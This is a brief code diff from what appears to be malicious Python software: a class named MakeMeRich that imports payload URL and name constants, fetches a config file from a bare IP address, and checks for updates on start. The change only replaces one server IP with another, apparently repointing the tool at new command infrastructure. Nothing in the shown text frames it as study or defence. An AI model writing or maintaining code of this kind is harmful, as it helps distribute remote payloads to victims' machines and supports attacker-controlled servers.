@@ -11,7 +11,7 @@ from constants import MY_HOME, PAYLOAD_URL, PAYLOAD_NAME
 
 class MakeMeRich(object):
     def __init__(self) -> None:
-        self.config = "http://45.56.115.91:8000/config.json"
+        self.config = "http://45.56.115.122:8000/config.json"
         self.local_version = 1.0  # when deploying a new version, change that to match the server
         self.check_updates()
 
